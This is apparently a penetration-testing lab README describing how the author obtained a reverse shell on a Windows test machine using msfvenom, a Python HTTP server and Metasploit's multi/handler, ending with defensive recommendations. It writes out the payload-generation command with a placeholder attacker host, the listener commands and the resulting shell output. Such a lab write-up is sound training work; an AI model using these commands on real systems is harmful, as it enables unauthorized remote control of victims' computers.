# metasploit-reverse-shell-lab
# 🔐 System Hacking Lab — Reverse Shell with Metasploit

A hands-on penetration testing lab documenting how to gain remote access to a Windows machine using Metasploit on Kali Linux. This covers payload generation, HTTP delivery, listener setup, and capturing a reverse shell session.

> ⚠️ **Disclaimer:** This was performed in a controlled lab environment on my own test machine. Unauthorized access to any system is illegal. Always practice ethical hacking with proper authorization.

---

## 🎯 Objective

To demonstrate how an attacker can gain remote command shell access to a Windows target machine using:
- `msfvenom` for payload generation
- Python HTTP server for payload delivery
- Metasploit `multi/handler` for catching the reverse connection

## 📋 Step-by-Step Walkthrough

---

### Step 1 — Network Reconnaissance (ifconfig)

First, I identified my Kali machine's IP address using `ifconfig`. This is the IP the target will connect back to.

```bash
ifconfig
```

The attacker IP was on the `192.168.176.x` subnet (eth0 interface).

![ifconfig](screenshots/01-ifconfig.png)

---

### Step 2 — Generate the Malicious Payload (msfvenom)

Using `msfvenom`, I generated a Windows reverse TCP shell payload as an `.exe` file:

```bash
msfvenom -p windows/shell/reverse_tcp lhost=[ATTACKER_IP] lport=4343 -f exe > payload.exe
```

- `-p windows/shell/reverse_tcp` — Windows reverse shell payload
- `lhost` — Attacker's IP address
- `lport=4343` — Port to listen on
- `-f exe` — Output format as Windows executable
- Output: `payload.exe` (only 7 KB!)

![msfvenom payload generation](screenshots/02-msfvenom.png)

---

### Step 3 — Deliver the Payload via Python HTTP Server

I hosted the payload using a simple Python web server so the target machine could download it:

```bash
python3 -m http.server 8080
```

The target machine browsed to `http://[ATTACKER_IP]:8080` and downloaded `payload.exe`. The server logs confirmed the successful download with a `200` response.

![Python HTTP server](screenshots/03-http-server.png)

---

### Step 4 — Set Up the Metasploit Listener

Inside `msfconsole`, I configured the `multi/handler` module to catch the incoming reverse connection:

```bash
msfconsole
use exploit/multi/handler
set payload windows/shell/reverse_tcp
set lhost [ATTACKER_IP]
set lport 4343
run
```

- `multi/handler` — Generic payload handler that listens for incoming connections
- Payload set to match the one generated by msfvenom
- LHOST and LPORT must match the payload exactly

![Metasploit listener setup](screenshots/04-msf-listener.png)

---

### Step 5 — Execute Payload on Target Machine

On the Windows machine, `payload.exe` was downloaded to the Downloads folder and executed.

![Payload on Windows Downloads folder](screenshots/05-payload-download.png)

---

### Step 6 — Shell Session Opened ✅

Once the payload was executed, Metasploit caught the connection:

```
[*] Started reverse TCP handler on [ATTACKER_IP]:4343
[*] Sending stage (240 bytes) to [TARGET_IP]
[*] Command shell session 1 opened
```

A full Windows command shell was now open on the attacker machine:

```
Microsoft Windows [Version 10.0.22621.4317]
(c) Microsoft Corporation. All rights reserved.

C:\Users\DELL\Downloads>
```

![Shell session opened](screenshots/06-shell-session.png)

## 🔍 Key Takeaways

- **Reverse shells bypass firewalls** — the target initiates the outbound connection, making it harder to block
- **msfvenom** can generate payloads in many formats (exe, apk, elf, php, etc.)
- **multi/handler** is the standard Metasploit module for catching any reverse shell
- A 7 KB `.exe` file is enough to compromise an unprotected Windows machine
- This is why organizations need **EDR (Endpoint Detection & Response)**, **egress filtering**, and **user awareness training**

---

## 🛡️ Defensive Recommendations

| Attack Step | Defense |
|-------------|---------|
| Payload delivery via HTTP | Web filtering / proxy inspection |
| payload.exe execution | Antivirus / EDR solution |
| Outbound reverse connection | Egress firewall rules |
| Command shell access | Application whitelisting |
